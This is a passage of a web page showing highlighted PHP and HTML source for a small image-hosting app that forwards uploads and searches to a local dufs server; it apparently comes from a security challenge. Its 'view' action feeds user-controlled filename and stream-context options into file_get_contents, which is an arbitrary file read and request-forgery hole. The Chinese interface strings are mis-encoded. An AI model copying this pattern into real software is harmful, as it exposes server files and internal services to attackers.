class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dufs_host</span> = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$dufs_port</span> = <span class="hljs-string">&#x27;5000&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;upload&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><br>        <span class="hljs-variable">$allowed_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>, PATHINFO_EXTENSION));<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_extension</span>, <span class="hljs-variable">$allowed_extensions</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$target_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">rawurlencode</span>(<span class="hljs-variable">$filename</span>);<br>        <br>        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$target_url</span>);<br>        <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CUSTOMREQUEST, <span class="hljs-string">&#x27;PUT&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$file_content</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Origin: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Referer: http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Encoding: gzip, deflate&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;Accept-Language: en,zh-CN;q=0.9,zh;q=0.8&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$file_content</span>)<br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ&#x27;</span>]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;å›¾ç‰‡ä¸Šä¼ å¤±è´¥ï¼Œè¯·ç¨åå†è¯•&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æœªé€‰æ‹©å›¾ç‰‡&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;search&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$search_query</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;query&#x27;</span>];<br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$search_query</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;åªå…è®¸è¾“å…¥æ•°å­—å’Œå­—æ¯&#x27;</span>]);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$search_url</span> = <span class="hljs-string">&#x27;http://&#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span> . <span class="hljs-string">&#x27;/?q=&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$search_query</span>) . <span class="hljs-string">&#x27;&amp;json&#x27;</span>;<br>        <br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$search_url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, [<br>            <span class="hljs-string">&#x27;Host: &#x27;</span> . <span class="hljs-variable">$dufs_host</span> . <span class="hljs-string">&#x27;:&#x27;</span> . <span class="hljs-variable">$dufs_port</span>,<br>            <span class="hljs-string">&#x27;Accept: */*&#x27;</span>,<br>            <span class="hljs-string">&#x27;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&#x27;</span><br>        ]);<br>        <br>        <span class="hljs-variable">$response</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$http_code</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$http_code</span> &gt;= <span class="hljs-number">200</span> &amp;&amp; <span class="hljs-variable">$http_code</span> &lt; <span class="hljs-number">300</span>) &#123;<br>            <span class="hljs-variable">$response_data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$response</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$image_extensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;bmp&#x27;</span>, <span class="hljs-string">&#x27;webp&#x27;</span>];<br>                <br>                <span class="hljs-variable">$filtered_paths</span> = [];<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;<br>                    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>                    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION));<br>                    <br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$image_extensions</span>) || (<span class="hljs-variable">$item</span>[<span class="hljs-string">&#x27;path_type&#x27;</span>] === <span class="hljs-string">&#x27;Directory&#x27;</span>)) &#123;<br>                        <span class="hljs-variable">$filtered_paths</span>[] = <span class="hljs-variable">$item</span>;<br>                    &#125;<br>                &#125;<br>                <br>                <span class="hljs-variable">$response_data</span>[<span class="hljs-string">&#x27;paths&#x27;</span>] = <span class="hljs-variable">$filtered_paths</span>;<br>                <br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response_data</span>)]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&#x27;result&#x27;</span> =&gt; <span class="hljs-variable">$response</span>]);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æœç´¢å¤±è´¥ï¼Œè¯·ç¨åå†è¯•&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;è¯·è¾“å…¥æœç´¢å…³é”®è¯&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>] === <span class="hljs-string">&#x27;view&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <br>        <span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_content</span> !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable">$base64_image</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$file_content</span>);<br>            <span class="hljs-variable">$mime_type</span> = <span class="hljs-string">&#x27;image/jpeg&#x27;</span>;<br>            <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>                <span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">true</span>, <br>                <span class="hljs-string">&#x27;is_image&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;base64_data&#x27;</span> =&gt; <span class="hljs-string">&#x27;data:&#x27;</span> . <span class="hljs-variable">$mime_type</span> . <span class="hljs-string">&#x27;;base64,&#x27;</span> . <span class="hljs-variable">$base64_image</span><br>            ]);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;æ— æ³•è·å–å›¾ç‰‡&#x27;</span>]);<br>        &#125;<br>        <br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;success&#x27;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;è¯·è¾“å…¥å›¾ç‰‡è·¯å¾„&#x27;</span>]);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;è¿·ä½ å›¾ç‰‡ç©ºé—´&lt;/title&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;style&gt;<br>        body &#123;<br>            font-family: Arial, sans-serif;<br>            max-width: <span class="hljs-number">800</span>px;<br>            margin: <span class="hljs-number">0</span> auto;<br>            padding: <span class="hljs-number">20</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>        &#125;<br>        .section &#123;<br>            margin-bottom: <span class="hljs-number">30</span>px;<br>            padding: <span class="hljs-number">15</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">5</span>px;<br>            background-color: white;<br>            box-shadow: <span class="hljs-number">0</span> <span class="hljs-number">2</span>px <span class="hljs-number">5</span>px <span class="hljs-title function_ invoke__">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>        &#125;<br>        h2 &#123;<br>            margin-top: <span class="hljs-number">0</span>;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        .form-group &#123;<br>            margin-bottom: <span class="hljs-number">15</span>px;<br>        &#125;<br>        label &#123;<br>            display: block;<br>            margin-bottom: <span class="hljs-number">5</span>px;<br>            font-weight: bold;<br>            color: <span class="hljs-comment">#4682b4;</span><br>        &#125;<br>        input[type=<span class="hljs-string">&quot;text&quot;</span>], input[type=<span class="hljs-string">&quot;file&quot;</span>] &#123;<br>            width: <span class="hljs-number">100</span>%;<br>            padding: <span class="hljs-number">8</span>px;<br>            box-sizing: border-box;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>        &#125;<br>        button &#123;<br>            padding: <span class="hljs-number">10</span>px <span class="hljs-number">15</span>px;<br>            background-color: <span class="hljs-comment">#4682b4;</span><br>            color: white;<br>            border: none;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            cursor: pointer;<br>        &#125;<br>        button:hover &#123;<br>            background-color: <span class="hljs-comment">#5f9ea0;</span><br>        &#125;<br>        .result &#123;<br>            margin-top: <span class="hljs-number">15</span>px;<br>            padding: <span class="hljs-number">10</span>px;<br>            border: <span class="hljs-number">1</span>px solid <span class="hljs-comment">#add8e6;</span><br>            border-radius: <span class="hljs-number">4</span>px;<br>            background-color: <span class="hljs-comment">#f0f8ff;</span><br>            display: none;<br>        &#125;<br>        pre &#123;<br>            white-space: pre-wrap;<br>            word-wrap: <span class="hljs-keyword">break</span>-word;<br>            background-color: <span class="hljs-comment">#f5f5f5;</span><br>            padding: <span class="hljs-number">10</span>px;<br>            border-radius: <span class="hljs-number">4</span>px;<br>            max-height: <span class="hljs-number">300</span>px;<br>            overflow-y: auto;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>    &lt;h1&gt;è¿·ä½ å›¾ç‰‡ç©ºé—´&lt;/h1&gt;<br>    <br>    &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">section</span>&quot;&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">h2</span>&gt;ä¸Šä¼ å›¾ç‰‡&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">        &lt;<span class="hljs-title">form</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">uploadForm</span>&quot; <span class="hljs-title">enctype</span>=&quot;<span class="hljs-title">multipart</span>/<span class="hljs-title">form</span>-<span class="hljs-title">data</span>&quot;&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">hidden</span>&quot; <span 